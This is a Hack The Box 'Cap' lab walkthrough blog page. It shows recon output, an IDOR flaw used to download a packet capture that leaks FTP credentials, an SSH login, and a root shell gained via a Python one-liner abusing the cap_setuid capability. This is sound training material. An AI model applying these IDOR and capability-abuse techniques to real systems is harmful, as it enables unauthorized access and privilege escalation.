@@ -1,0 +1,682 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB Walkthrough - CapRecon:123456789101112131415161718192021222324252627282930313233343536373839Nmap scan report for 10.10.10.245Host is up (0.088s latency).PORT   STATE SERVICE VERSION21&#x2F;tcp open  ft">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Cap">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Cap.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="HTB Walkthrough - CapRecon:123456789101112131415161718192021222324252627282930313233343536373839Nmap scan report for 10.10.10.245Host is up (0.088s latency).PORT   STATE SERVICE VERSION21&#x2F;tcp open  ft">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115604658.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115938462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518120439844.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518122122729.png">
+<meta property="article:published_time" content="2023-08-13T22:39:08.994Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.007Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115604658.png">
+  
+  
+  
+  <title>HTB Walkthrough - Cap - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Cap"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Cap</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HTB-Walkthrough-Cap"><a href="#HTB-Walkthrough-Cap" class="headerlink" title="HTB Walkthrough - Cap"></a>HTB Walkthrough - Cap</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.245</span><br><span class="line">Host is up (0.088s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp open  http    gunicorn                              </span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 NOT FOUND                                    </span><br><span class="line">|     Server: gunicorn                                                 </span><br><span class="line">|     Date: Sat, 22 May 2021 10:51:48 GMT</span><br><span class="line">|     Connection: close                                                </span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 232</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;                                             </span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;               </span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;                         </span><br><span class="line">|   GetRequest:                        </span><br><span class="line">|     HTTP/1.0 200 OK                  </span><br><span class="line">|     Server: gunicorn                 </span><br><span class="line">|     Date: Sat, 22 May 2021 10:51:42 GMT                                      </span><br><span class="line">|     Connection: close                </span><br><span class="line">|     Content-Type: text/html; charset=utf-8                                   </span><br><span class="line">|     Content-Length: 19386                                                    </span><br><span class="line">|     &lt;!DOCTYPE html&gt;                  </span><br><span class="line">|     &lt;html class=<span class="string">&quot;no-js&quot;</span> lang=<span class="string">&quot;en&quot;</span>&gt;                                           </span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">......</span><br><span class="line">SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 133.13 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>Nmap没有确定FTP可以被匿名访问：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115604658.png" srcset="/img/loading.gif" lazyload alt="image-20220518115604658"  />
+
+<p>有个IP config点击会打印IP信息，但参数是死的，IP是事先准备好的文件：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115938462.png" srcset="/img/loading.gif" lazyload alt="image-20220518115938462"  />
+
+<p>取于以下文章介绍：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/access-control/idor</span><br></pre></td></tr></table></figure>
+
+<h4 id="不安全的直接对象引用-IDOR-4"><a href="#不安全的直接对象引用-IDOR-4" class="headerlink" title="不安全的直接对象引用 (IDOR)4"></a>不安全的直接对象引用 (IDOR)4</h4><p>在本节中，我们将解释什么是不安全的直接对象引用 (IDOR)，并描述一些常见的漏洞。</p>
+<h4 id="什么是不安全的直接对象引用-IDOR-？"><a href="#什么是不安全的直接对象引用-IDOR-？" class="headerlink" title="什么是不安全的直接对象引用 (IDOR)？"></a>什么是不安全的直接对象引用 (IDOR)？</h4><p>不安全的直接对象引用 (IDOR) 是一种<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">访问控制</a>漏洞，当应用程序使用用户提供的输入直接访问对象时会出现这种漏洞。IDOR 一词因出现在 OWASP 2007 Top 10 中而广为人知。然而，这只是可能导致绕过<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">访问控制的许多访问控制实施错误的一个示例。</a>IDOR 漏洞最常与水平权限提升相关，但也可能与垂直权限提升相关。</p>
+<h4 id="IDOR-示例"><a href="#IDOR-示例" class="headerlink" title="IDOR 示例"></a>IDOR 示例</h4><p>有许多访问控制漏洞的例子，其中用户控制的参数值用于直接访问资源或功能。</p>
+<h4 id="直接引用数据库对象的-IDOR-漏洞"><a href="#直接引用数据库对象的-IDOR-漏洞" class="headerlink" title="直接引用数据库对象的 IDOR 漏洞"></a>直接引用数据库对象的 IDOR 漏洞</h4><p>考虑一个网站，它通过从后端数据库检索信息，使用以下 URL 访问客户帐户页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/customer_account?customer_number=132355</span><br></pre></td></tr></table></figure>
+
+<p>在这里，客户编号直接用作在后端数据库上执行的查询中的记录索引。如果没有其他控制措施，攻击者可以简单地修改该<code>customer_number</code>值，绕过访问控制来查看其他客户的记录。这是导致横向权限提升的 IDOR 漏洞示例。</p>
+<p>攻击者可能能够通过在绕过访问控制的同时将用户更改为具有额外权限的用户来执行水平和垂直权限提升。例如，其他可能性包括一旦攻击者登陆用户的帐户页面，利用密码泄漏或修改参数。</p>
+<h4 id="直接引用静态文件的-IDOR-漏洞"><a href="#直接引用静态文件的-IDOR-漏洞" class="headerlink" title="直接引用静态文件的 IDOR 漏洞"></a>直接引用静态文件的 IDOR 漏洞</h4><p>当敏感资源位于服务器端文件系统的静态文件中时，通常会出现 IDOR 漏洞。例如，网站可能会使用递增的文件名将聊天消息记录保存到磁盘，并允许用户通过访问如下 URL 来检索这些记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/static/12144.txt</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，攻击者可以简单地修改文件名来检索另一个用户创建的脚本，并可能获取用户凭据和其他敏感数据。</p>
+<p>在该站点有一个download按钮：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518120439844.png" srcset="/img/loading.gif" lazyload alt="image-20220518120439844"  />
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/download/2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.245</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.245/data/2</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>命令匹配规则似乎只是单纯的数字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; wget 10.10.10.245/download/0 </span><br></pre></td></tr></table></figure>
+
+<p>是pcap文件，可以用wireshark打开</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518122122729.png" srcset="/img/loading.gif" lazyload alt="image-20220518122122729"  />
+
+<p>在FTP会话的协议包中会有一组与在web站点看到管理员用户名一样的凭证，而且是登录成功的。nathan:Buck3tH4TF0RM3!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ssh nathan@10.10.10.245                                          </span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.245 (10.10.10.245)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.245<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">nathan@10.10.10.245&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">Last login: Thu May 27 11:21:27 2021 from 10.10.14.7</span><br><span class="line">nathan@<span class="built_in">cap</span>:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">db..............................</span><br></pre></td></tr></table></figure>
+
+<p>在我遍历SUID发现python3.8可以设置uid：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nathan@<span class="built_in">cap</span>:~$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">nathan@<span class="built_in">cap</span>:~$ python3.8 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@<span class="built_in">cap</span>:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1001(nathan) <span class="built_in">groups</span>=1001(nathan)</span><br><span class="line">root@<span class="built_in">cap</span>:~<span class="comment"># cat /root/root.txt </span></span><br><span class="line">59..............................</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Cap</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Cap.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Cascade.html" title="HTB Walkthrough Cascade">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough Cascade</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Canape.html" title="HTB Walkthrough - Canape">
+                        <span class="hidden-mobile">HTB Walkthrough - Canape</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
